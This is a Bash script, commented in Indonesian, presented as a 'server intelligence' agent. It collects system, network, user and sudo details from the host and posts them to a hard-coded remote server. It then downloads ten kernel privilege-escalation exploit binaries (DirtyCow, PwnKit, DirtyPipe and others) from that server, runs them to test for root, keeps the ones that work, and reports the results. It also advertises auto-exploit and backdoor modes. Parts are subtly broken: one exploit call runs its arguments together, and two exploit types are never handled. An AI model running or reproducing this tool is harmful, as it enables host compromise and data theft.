#!/bin/bash
# ============================================================
# KARNEL AGENT - Modifikasi untuk server kamu
# Arahkan ke: http://172.30.239.232:8080
# ============================================================

# ⚡ SET KE SERVER KAMU ⚡
KARNEL_BASE_URL="http://172.30.239.232:8080"
KARNEL_API_URL="http://172.30.239.232:8080/v1/collect"

# Mode (default aman = cuma scan, ga exploit, ga persist)
QUICK_MODE="${QUICK:-0}"
AUTO_EXPLOIT="${AUTO_EXPLOIT:-0}"
PERSIST_MODE="${PERSIST:-0}"
SILENT_MODE="${SILENT:-0}"

# --- BANNER & COLLECTION ---
# (sama persis dengan script original, cuma URL udah diganti)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

log() {
    [ "$SILENT_MODE" != "1" ] && echo -e "$@"
}

print_banner() {
    [ "$SILENT_MODE" = "1" ] && return
    echo -e "${RED}"
    echo "       █████    ███████    ███████████ █████   █████"
    echo "      ▒▒███   ███▒▒▒▒▒███ ▒█▒▒▒███▒▒▒█▒▒███   ▒▒███ "
    echo "       ▒███  ███     ▒▒███▒   ▒███  ▒  ▒███    ▒███ "
    echo "       ▒███ ▒███      ▒███    ▒███     ▒███████████ "
    echo "       ▒███ ▒███      ▒███    ▒███     ▒███▒▒▒▒▒███ "
    echo " ███   ▒███ ▒▒███     ███     ▒███     ▒███    ▒███ "
    echo "▒▒████████   ▒▒▒███████▒      █████    █████   █████"
    echo " ▒▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒       ▒▒▒▒▒    ▒▒▒▒▒   ▒▒▒▒▒"
    echo -e "${NC}"
    echo -e "${RED}AKTR1PT1C - Server Intelligence Platform${NC}"
    echo "===================================================="
    [ "$QUICK_MODE" = "1" ] && echo -e "${YELLOW}[QUICK MODE]${NC} 30s timeout"
    [ "$AUTO_EXPLOIT" = "1" ] && echo -e "${RED}[AUTO EXPLOIT]${NC} Will exploit if vulnerable"
    [ "$PERSIST_MODE" = "1" ] && echo -e "${BLUE}[PERSISTENCE]${NC} Will install backdoor"
    echo ""
}

get_machine_id() {
    if [ -f /etc/machine-id ]; then
        cat /etc/machine-id
    elif [ -f /var/lib/dbus/machine-id ]; then
        cat /var/lib/dbus/machine-id
    else
        hostname | md5sum | cut -d' ' -f1
    fi
}

collect_system_info() {
    log "${GREEN}[✓]${NC} Collecting system information..."
    HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    OS_NAME=$(cat /etc/os-release 2>/dev/null | grep "^PRETTY_NAME=" | cut -d'"' -f2 || echo "unknown")
    KERNEL=$(uname -r 2>/dev/null || echo "unknown")
    ARCH=$(uname -m 2>/dev/null || echo "unknown")
    UPTIME=$(uptime -p 2>/dev/null | sed 's/up //' || echo "unknown")
    LOAD=$(cat /proc/loadavg 2>/dev/null | awk '{print $1", "$2", "$3}' || echo "unknown")
}

collect_hardware_info() {
    log "${GREEN}[✓]${NC} Collecting hardware information..."
    CPU_MODEL=$(cat /proc/cpuinfo 2>/dev/null | grep "model name" | head -1 | cut -d':' -f2 | xargs || echo "unknown")
    CPU_CORES=$(nproc 2>/dev/null || echo "unknown")
    RAM_TOTAL=$(free -m 2>/dev/null | awk '/^Mem:/{print $2}' || echo "0")
    RAM_USED=$(free -m 2>/dev/null | awk '/^Mem:/{print $3}' || echo "0")
    DISK_TOTAL=$(df -h / 2>/dev/null | awk 'NR==2{print $2}' || echo "unknown")
    DISK_USED=$(df -h / 2>/dev/null | awk 'NR==2{print $3}' || echo "unknown")
    DISK_PERCENT=$(df -h / 2>/dev/null | awk 'NR==2{print $5}' || echo "unknown")
}

collect_network_info() {
    log "${GREEN}[✓]${NC} Collecting network information..."
    PUBLIC_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "unknown")
    PRIVATE_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1" | head -1 | awk '{print $2}' | cut -d'/' -f1 || echo "unknown")
    MAC_ADDR=$(ip link show 2>/dev/null | grep "link/ether" | head -1 | awk '{print $2}' || echo "unknown")
    OPEN_PORTS=$(ss -tuln 2>/dev/null | grep LISTEN | awk '{print $5}' | rev | cut -d':' -f1 | rev | sort -un | tr '\n' ',' | sed 's/,$//' || echo "unknown")
}

collect_user_info() {
    log "${GREEN}[✓]${NC} Collecting user information..."
    CURRENT_USER=$(whoami 2>/dev/null || echo "unknown")
    USER_ID=$(id -u 2>/dev/null || echo "0")
    GROUP_ID=$(id -g 2>/dev/null || echo "0")
    GROUPS=$(groups 2>/dev/null | tr ' ' ',' || echo "unknown")
    HOME_DIR=$(echo $HOME || echo "unknown")
    SHELL=$(echo $SHELL || echo "unknown")
    IS_ROOT="false"
    [ "$USER_ID" = "0" ] && IS_ROOT="true"
    SUDO_ACCESS="false"
    if command -v sudo &>/dev/null; then
        if sudo -n true 2>/dev/null; then
            SUDO_ACCESS="true"
        fi
    fi
}

collect_services_info() {
    log "${GREEN}[✓]${NC} Collecting service information..."
    VIRTUALIZATION=$(systemd-detect-virt 2>/dev/null || echo "unknown")
    DOCKER_INSTALLED="false"; DOCKER_RUNNING="false"; DOCKER_CONTAINERS="0"
    if command -v docker &>/dev/null; then
        DOCKER_INSTALLED="true"
        if docker info &>/dev/null 2>&1; then
            DOCKER_RUNNING="true"
            DOCKER_CONTAINERS=$(docker ps -q 2>/dev/null | wc -l || echo "0")
        fi
    fi
    if command -v ufw &>/dev/null && ufw status 2>/dev/null | grep -q "active"; then
        FIREWALL="ufw (active)"
    elif command -v firewall-cmd &>/dev/null && firewall-cmd --state 2>/dev/null | grep -q "running"; then
        FIREWALL="firewalld (active)"
    else
        FIREWALL="none"
    fi
    if command -v dpkg &>/dev/null; then
        PKG_COUNT=$(dpkg -l 2>/dev/null | grep "^ii" | wc -l || echo "unknown")
    elif command -v rpm &>/dev/null; then
        PKG_COUNT=$(rpm -qa 2>/dev/null | wc -l || echo "unknown")
    else
        PKG_COUNT="unknown"
    fi
    PROCESS_COUNT=$(ps aux 2>/dev/null | wc -l || echo "unknown")
    SELINUX="not installed"
    command -v getenforce &>/dev/null && SELINUX=$(getenforce 2>/dev/null || echo "unknown")
}

print_summary() {
    [ "$SILENT_MODE" = "1" ] && return
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}         COLLECTED DATA SUMMARY        ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}System:${NC}"
    echo -e "  Hostname:     ${GREEN}$HOSTNAME${NC}"
    echo -e "  OS:           ${GREEN}$OS_NAME${NC}"
    echo -e "  Kernel:       ${GREEN}$KERNEL${NC}"
    echo -e "  Architecture: ${GREEN}$ARCH${NC}"
    echo ""
    echo -e "${YELLOW}Hardware:${NC}"
    echo -e "  CPU:          ${GREEN}$CPU_MODEL${NC}"
    echo -e "  Cores:        ${GREEN}$CPU_CORES${NC}"
    echo -e "  RAM:          ${GREEN}$RAM_TOTAL MB${NC}"
    echo ""
    echo -e "${YELLOW}Network:${NC}"
    echo -e "  Public IP:    ${GREEN}$PUBLIC_IP${NC}"
    echo -e "  Private IP:   ${GREEN}$PRIVATE_IP${NC}"
    echo ""
    echo -e "${YELLOW}User:${NC}"
    echo -e "  Username:     ${GREEN}$CURRENT_USER${NC}"
    echo -e "  UID:          ${GREEN}$USER_ID${NC}"
    echo -e "  Root:         ${GREEN}$IS_ROOT${NC}"
    echo -e "  Sudo:         ${GREEN}$SUDO_ACCESS${NC}"
    echo ""
}

send_data() {
    log "${GREEN}[✓]${NC} Sending data to server..."
    MACHINE_ID=$(get_machine_id)
    JSON_DATA=$(cat <<EOF
{
    "machine_id": "$MACHINE_ID",
    "system": {
        "hostname": "${HOSTNAME:-unknown}",
        "os": "${OS_NAME:-unknown}",
        "kernel": "${KERNEL:-unknown}",
        "arch": "${ARCH:-unknown}",
        "uptime": "${UPTIME:-unknown}",
        "load_average": "${LOAD:-unknown}"
    },
    "hardware": {
        "cpu_model": "${CPU_MODEL:-unknown}",
        "cpu_cores": "${CPU_CORES:-0}",
        "ram_total_mb": ${RAM_TOTAL:-0},
        "ram_used_mb": ${RAM_USED:-0},
        "disk_total": "${DISK_TOTAL:-unknown}",
        "disk_used": "${DISK_USED:-unknown}",
        "disk_percent": "${DISK_PERCENT:-unknown}"
    },
    "network": {
        "public_ip": "${PUBLIC_IP:-unknown}",
        "private_ip": "${PRIVATE_IP:-unknown}",
        "mac_address": "${MAC_ADDR:-unknown}",
        "open_ports": "${OPEN_PORTS:-}"
    },
    "user": {
        "username": "${CURRENT_USER:-unknown}",
        "uid": ${USER_ID:-0},
        "gid": ${GROUP_ID:-0},
        "groups": "${GROUPS:-}",
        "home": "${HOME_DIR:-unknown}",
        "shell": "${SHELL:-unknown}",
        "is_root": ${IS_ROOT:-false},
        "sudo_access": ${SUDO_ACCESS:-false}
    },
    "services": {
        "virtualization": "${VIRTUALIZATION:-unknown}",
        "docker": {
            "installed": ${DOCKER_INSTALLED:-false},
            "running": ${DOCKER_RUNNING:-false},
            "running_containers": ${DOCKER_CONTAINERS:-0}
        },
        "firewall": "${FIREWALL:-unknown}",
        "installed_packages": "${PKG_COUNT:-unknown}",
        "process_count": "${PROCESS_COUNT:-unknown}",
        "selinux": "${SELINUX:-unknown}"
    }
}
EOF
)
    RESPONSE=$(curl -s -X POST "$KARNEL_API_URL" -H "Content-Type: application/json" -d "$JSON_DATA" 2>/dev/null)
    if echo "$RESPONSE" | grep -q "server_id"; then
        SERVER_ID=$(echo "$RESPONSE" | grep -o '"server_id":"[^"]*"' | cut -d'"' -f4)
        log "${GREEN}[✓]${NC} Data sent successfully!"
        log "    Server ID: ${CYAN}$SERVER_ID${NC}"
    else
        log "${YELLOW}[!]${NC} Server response: $RESPONSE"
    fi
}

test_exploit() {
    local lower="$1"
    local name="$2"
    local cve="$3"
    local etype="$4"
    local binary="./$lower"
    local TIMEOUT=30

    curl -sL "$KARNEL_BASE_URL/bin/$lower" -o "$binary" 2>/dev/null
    [ ! -f "$binary" ] && return
    chmod +x "$binary"

    local is_vuln="false"
    local status="safe"

    if [[ "$etype" == "shell" ]]; then
        local outfile="/tmp/exp_out_$$_$RANDOM"
        rm -f "$outfile" 2>/dev/null
        (
            exec 2>/dev/null
            (echo "id" | "$binary") > "$outfile" 2>/dev/null || "$binary" >> "$outfile" 2>/dev/null
        ) &
        local pid=$!
        local waited=0
        while kill -0 $pid 2>/dev/null && [ $waited -lt $TIMEOUT ]; do
            sleep 2
            waited=$((waited + 2))
        done
        if kill -0 $pid 2>/dev/null; then
            kill -9 $pid 2>/dev/null
            wait $pid 2>/dev/null
            status="crash"
        else
            wait $pid 2>/dev/null
            local out=$(cat "$outfile" 2>/dev/null)
            if echo "$out" | grep -q "uid=0"; then
                is_vuln="true"
                status="vulnerable"
            fi
        fi
        rm -f "$outfile" 2>/dev/null
    elif [[ "$etype" == "passwd" ]]; then
        { "$binary" 2>/dev/null; } &
        local pid=$!
        local waited=0
        while kill -0 $pid 2>/dev/null && [ $waited -lt $TIMEOUT ]; do
            sleep 2
            waited=$((waited + 2))
        done
        if kill -0 $pid 2>/dev/null; then
            kill -9 $pid 2>/dev/null 2>&1
            status="crash"
        else
            local su_out=$(echo "" | su -c "id" root 2>/dev/null)
            if echo "$su_out" | grep -q "uid=0"; then
                is_vuln="true"
                status="vulnerable"
            fi
        fi
    fi

    if [ "$is_vuln" = "true" ]; then
        echo -e "${RED}[VULN]${NC} $name ($cve)"
        echo "$name|$binary|$cve|$etype" >> /tmp/vuln_exploits.txt
        if [ "$AUTO_EXPLOIT" = "1" ]; then
            [ "$etype" == "shell" ] && echo "id" | "$binary" 2>/dev/null
            [ "$etype" == "passwd" ] && "$binary" 2>/dev/null
        fi
    elif [ "$status" = "crash" ]; then
        echo -e "${BLUE}[CRASH]${NC} $name ($cve)"
    else
        echo -e "${GREEN}[SAFE]${NC} $name ($cve)"
    fi

    [ "$is_vuln" != "true" ] && rm -f "$binary" 2>/dev/null

    curl -s -X POST "$KARNEL_BASE_URL/v1/audit/live" \
        -H "Content-Type: application/json" \
        -d "{\"machine_id\":\"$(get_machine_id)\",\"exploit\":\"$lower\",\"name\":\"$name\",\"cve\":\"$cve\",\"status\":\"$status\"}" >/dev/null 2>&1
}

run_security_audit() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════${NC}"
    echo -e "${CYAN}   SECURITY AUDIT - KERNEL EXPLOITS   ${NC}"
    echo -e "${CYAN}═════════════════════════════════════════${NC}"
    echo ""

    # Top 10 most common exploits (ringkas)
    test_exploit "dirtycow"      "DirtyCow"      "CVE-2016-5195"  "shell"
    test_exploit "dirtypipe"     "DirtyPipe"     "CVE-2022-0847"  "shell"
    test_exploit "pkexec"        "PwnKit"        "CVE-2021-4034"  "shell"
    test_exploit "cve20234911"   "LooneyTunables""CVE-2023-4911"  "shell"
    test_exploit "cve20233269"   "StackRot"      "CVE-2023-3269"  "shell"
    test_exploit "cve20232640"   "GameOverlay"   "CVE-2023-2640"  "shell"
    test_exploit "cve20222588"   "DirtyCred"     "CVE-2022-2588"  "user:user"
    test_exploit "cve20221315"   "BaronSamedit"  "CVE-2021-3156"  "user:gg"
    test_exploit "cve202122555"  "Netfilter"     "CVE-2021-22555" "shell"
    test_exploit "ebpf"          "eBPF"          "CVE-2021-3490"  "shell"

    echo ""
}

main() {
    print_banner
    collect_system_info
    collect_hardware_info
    collect_network_info
    collect_user_info
    collect_services_info
    print_summary
    send_data
    run_security_audit
}

main "$@"
